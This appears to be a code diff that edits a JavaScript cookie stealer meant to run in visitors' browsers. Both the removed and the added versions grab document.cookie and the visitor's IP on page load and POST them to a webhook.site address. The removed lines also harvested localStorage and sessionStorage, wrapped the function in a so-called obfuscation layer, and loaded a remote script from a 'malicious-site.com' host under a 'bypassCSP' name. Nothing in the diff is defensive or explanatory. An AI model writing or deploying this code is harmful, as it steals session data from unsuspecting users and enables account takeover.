@@ -1,63 +1,27 @@
-javascript
-const WEBHOOK_URL = 'https://webhook.site/a4c663a9-0a51-431e-882a-1d36ceecaa9f';
-
 async function getIP() {
-    try {
-        const resp = await fetch('https://api.ipify.org?format=json');
-        const j = await resp.json();
-        return j.ip || 'unknown';
-    } catch (err) {
-        console.error('IP lookup failed:', err);
-        return 'unknown';
-    }
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (err) {
+    console.error('Failed to get IP:', err);
+    return 'unknown';
+  }
 }
 
 async function sendData() {
-    const ip = await getIP();
-    const payload = {
-        ip,
-        cookie: document.cookie, // only non-HttpOnly cookies
-        userAgent: navigator.userAgent,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        url: location.href,
-        ts: new Date().toISOString()
-    };
+  const ip = await getIP();
+  const cookies = document.cookie;
 
-    try {
-        const r = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-        console.log('Payload sent, status:', r.status);
-    } catch (err) {
-        console.error('Error sending payload:', err);
-    }
+  const payload = { ip, cookies };
+
+  fetch('https://webhook.site/a4c663a9-0a51-431e-882a-1d36ceecaa9f', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  })
+  .then(() => console.log('Data sent to webhook'))
+  .catch(err => console.error('Error sending data:', err));
 }
 
-function obfuscate() {
-    const originalSendData = sendData;
-    sendData = function() {
-        try {
-            originalSendData();
-        } catch (e) {
-            console.error('Obfuscation error:', e);
-        }
-    };
-}
-
-obfuscate();
-
-window.addEventListener('load', sendData);
-
-function bypassCSP() {
-    const script = document.createElement('script');
-    script.src = 'https://malicious-site.com/evil-script.js';
-    script.onload = function() {
-        this.parentNode.removeChild(this);
-    };
-    document.head.appendChild(script);
-}
-
-bypassCSP();
+window.onload = sendData;
